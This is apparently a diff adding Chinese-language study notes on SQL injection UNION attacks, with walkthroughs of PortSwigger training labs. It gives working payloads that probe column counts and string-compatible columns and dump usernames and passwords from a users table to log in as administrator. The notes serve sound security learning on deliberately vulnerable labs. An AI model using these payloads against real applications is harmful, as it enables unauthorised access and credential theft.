@@ -154,6 +154,83 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 - 有关特定数据库的语法，详见[`SQL injection cheat sheet`](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 
+## 查找具有有用数据类型的列
+
+- SQL注入UNION攻击能从注入的查询中检索结果。通常想要检索的数据是字符串形式的。这意味着需要在原始查询结果中找到数据类型为字符串数据或与字符串数据兼容的一个或多个列。
+- 确定所需列的数量后，可以探测每一列以测试它是否可以容纳字符串数据，可以提交一系列的`UNION SELECT`的payload，依次将字符串数据插入到每一列中。如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误。如果没有发生错误，并且应用程序的响应包含一些附加内容（包括注入的字符串值），则相关列适合于检索字符串数据。
+- 例子：
+  ```sql
+  # 首先确定查询返回的列数是4列，然后探测每一列以测试它是否可以容纳字符串数据
+  ' UNION SELECT 'a',NULL,NULL,NULL--
+  ' UNION SELECT NULL,'a',NULL,NULL--
+  ' UNION SELECT NULL,NULL,'a',NULL--
+  ' UNION SELECT NULL,NULL,NULL,'a'--
+  ```
+
+### 🧪实验：SQL注入UNION攻击，查找具有有用数据类型的列
+
+#### 实验说明
+
+- 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后识别与字符串数据兼容的列。
+- 本实验将提供一个随机值，需要使其出现在查询结果中。
+
+#### 解题过程
+
+- 首先使用`SELECT UNION NULL`确定返回的列数，经测试，当有3个`NULL`时,即`?category=Accessories' UNION SELECT NULL,NULL,NULL-- `，不再返回错误,因此返回的列数为3
+  ![](LAB4-1-查询返回的列数.png)
+- 然后确认有用的数据类型的列，执行以下payload：
+  ```sql
+  # 只有第二个成功，因此第二列是字符串类型
+  ?category=Accessories' UNION SELECT 'a',NULL,NULL-- 
+  ?category=Accessories' UNION SELECT NULL,'eDqVcW',NULL-- 
+  ?category=Accessories' UNION SELECT NULL,NULL,'a'-- 
+  ```
+- 实验要求使用平台提供的随机值，因此将随机值插入到第二列中，即`?category=Accessories' UNION SELECT NULL,'eDqVcW',NULL-- `
+  ![](LAB4-2-确定字符串类型的列（使用实验环境提供的随机字符串测试）.png)
+- 完成实验✅
+
+
+## 使用SQL注入UNION攻击检索感兴趣的数据
+
+- 当确定了原始查询返回的列数并找到了哪些列可以保存字符串数据时，就可以检索感兴趣的数据了。
+- 假设：
+  - 原始查询返回两列，这两列都可以保存字符串数据
+  - 注入点是`WHERE`子句中一个带引号的字符串
+  - 数据库包含一个名为`users`的表，其中包含`username`和`password`列
+- 在这个例子中，可以通过执行以下SQL注入UNION攻击来检索`username`和`password`列的数据：
+  ```sql
+  ' UNION SELECT username, password FROM users--
+  ```
+- 为了执行这个攻击，需要`users`表及列的名称。如果没有，可以猜测表和列的名称。所有现代数据库都提供了检查数据库结构的方法，能够通过这些方法来确定表和列的名称。
+
+
+### 🧪实验：SQL注入UNION攻击，从其他表中检索数据
+
+#### 实验说明
+
+- 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。
+- 数据库中包含一个名为`users`的表，其中包含`username`和`password`列。
+- 任务：执行SQL注入UNION攻击，检索`username`和`password`列的数据，并使用这些信息以`administrator`的身份登录。
+
+#### 解题过程
+
+- 首先确认列数：
+  ``` sql
+  ?category=Accessories' UNION SELECT NULL-- 
+  ?category=Accessories' UNION SELECT NULL,NULL-- 
+  # 成功，说明返回的列数为2
+  ```
+- 然后确定每一列的类型：
+  ```sql
+  ?category=Accessories' UNION SELECT 'a',NULL-- 
+  ?category=Accessories' UNION SELECT NULL,'a'-- 
+  # 两个都成功，说明两列都是字符串类型
+  ```
+- 使用`?category=Accessories' UNION SELECT username, password FROM users`进行注入，成功获取`username`和`password`列的数据
+  ![](LAB5-1-获得用户名密码.png)
+- 使用获得的用户名和密码登录成功
+- 完成实验✅
+
 
 
 
